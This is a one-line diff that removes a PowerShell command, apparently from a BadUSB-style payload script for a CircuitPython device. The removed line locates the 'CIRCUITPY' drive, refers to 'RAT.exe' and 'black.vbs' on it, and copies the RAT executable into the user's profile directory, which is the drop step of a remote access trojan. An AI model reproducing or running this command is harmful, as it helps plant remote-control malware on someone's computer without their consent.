@@ -1,1 +1,0 @@
-powershell $letter=(Get-Volume -FileSystemLabel 'CIRCUITPY').DriveLetter; $unit="${letter}:\"; $rat="${unit}RAT.exe"; $vbs="${unit}black.vbs"; cd "${letter}:"; Copy-Item -path $rat -destination $env:USERPROFILE
